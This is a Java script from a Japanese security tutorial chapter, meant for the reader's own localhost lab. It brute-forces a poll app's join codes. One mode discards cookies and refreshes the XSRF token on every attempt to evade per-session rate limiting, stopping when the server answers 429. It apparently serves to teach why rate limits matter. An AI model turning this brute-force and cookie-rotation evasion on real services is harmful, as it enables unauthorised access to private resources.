// 第33章：参加コードの総当たり。自分のラボ（localhost）に対してだけ使うこと。
//
// 使い方（ラボを --lab.join-code-length=3 で起動しておく）:
//   java scripts/BruteForce.java http://localhost:18033            # Cookie を保ったまま、全部の組み合わせを試す
//   java scripts/BruteForce.java http://localhost:18033 rotate     # 試すたびに Cookie を捨てる（新しい訪問者になりすます）
//
// 仕組み：被害者として投票を1つ作り（参加コードはサーバーが決める）、攻撃者として
//   POST /api/join に ALPHABET の全組み合わせを送る。200 が返ったら当たり。
//   429 が返ったら Retry-After を表示して止まる。
import java.net.CookieManager;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

static final String ALPHABET = "ABCDEFGHJKMNPQRSTUVWXYZ23456789";

HttpClient newClient() {
    return HttpClient.newBuilder().cookieHandler(new CookieManager()).build();
}

String xsrf(HttpClient client, String base) throws Exception {
    client.send(HttpRequest.newBuilder(URI.create(base + "/victim.html")).GET().build(),
            HttpResponse.BodyHandlers.discarding());
    var cookies = ((CookieManager) client.cookieHandler().get()).getCookieStore().getCookies();
    return cookies.stream().filter(c -> c.getName().equals("XSRF-TOKEN")).findFirst().orElseThrow().getValue();
}

HttpResponse<String> post(HttpClient client, String base, String path, String xsrf, String json) throws Exception {
    var request = HttpRequest.newBuilder(URI.create(base + path))
            .header("Content-Type", "application/json")
            .header("X-XSRF-TOKEN", xsrf)
            .POST(HttpRequest.BodyPublishers.ofString(json, StandardCharsets.UTF_8)).build();
    return client.send(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
}

void main(String[] args) throws Exception {
    String base = args.length > 0 ? args[0] : "http://localhost:18033";
    boolean rotate = args.length > 1 && args[1].equals("rotate");

    // 被害者：投票を作る
    var victim = newClient();
    var created = post(victim, base, "/api/polls", xsrf(victim, base),
            "{\"title\":\"秘密の投票\",\"closesInMinutes\":30,\"allowMemberOptions\":false,\"options\":[\"A\"]}");
    Matcher m = Pattern.compile("\"joinCode\":\"([A-Z0-9]+)\"").matcher(created.body());
    if (!m.find()) {
        IO.println("投票を作れませんでした: " + created.statusCode() + " " + created.body());
        return;
    }
    String secret = m.group(1);
    int length = secret.length();
    IO.println("被害者の参加コードは " + length + " 文字（答えは伏せて総当たりを始めます）");

    // 攻撃者：全組み合わせ
    var attacker = newClient();
    String token = xsrf(attacker, base);
    long total = (long) Math.pow(ALPHABET.length(), length);
    long start = System.nanoTime();
    long attempts = 0;
    int[] idx = new int[length];
    while (true) {
        StringBuilder guess = new StringBuilder();
        for (int i : idx) {
            guess.append(ALPHABET.charAt(i));
        }
        if (rotate) {
            attacker = newClient();
            token = xsrf(attacker, base);
        }
        var res = post(attacker, base, "/api/join", token, "{\"code\":\"" + guess + "\"}");
        attempts++;
        if (res.statusCode() == 200) {
            IO.println("当たり: " + guess + "  試行 " + attempts + " 回 / 全 " + total + " 通り  "
                    + (System.nanoTime() - start) / 1_000_000 + " ms");
            IO.println("答え合わせ: " + (guess.toString().equals(secret) ? "一致" : "不一致"));
            return;
        }
        if (res.statusCode() == 429) {
            IO.println("429 で止められた: 試行 " + attempts + " 回目  Retry-After="
                    + res.headers().firstValue("Retry-After").orElse("?") + " 秒  "
                    + (System.nanoTime() - start) / 1_000_000 + " ms");
            return;
        }
        // 次の組み合わせ（31進数のカウントアップ）
        int pos = length - 1;
        while (pos >= 0 && ++idx[pos] == ALPHABET.length()) {
            idx[pos--] = 0;
        }
        if (pos < 0) {
            IO.println("全部試しても当たりませんでした（投票の締切などを確認）");
            return;
        }
    }
}
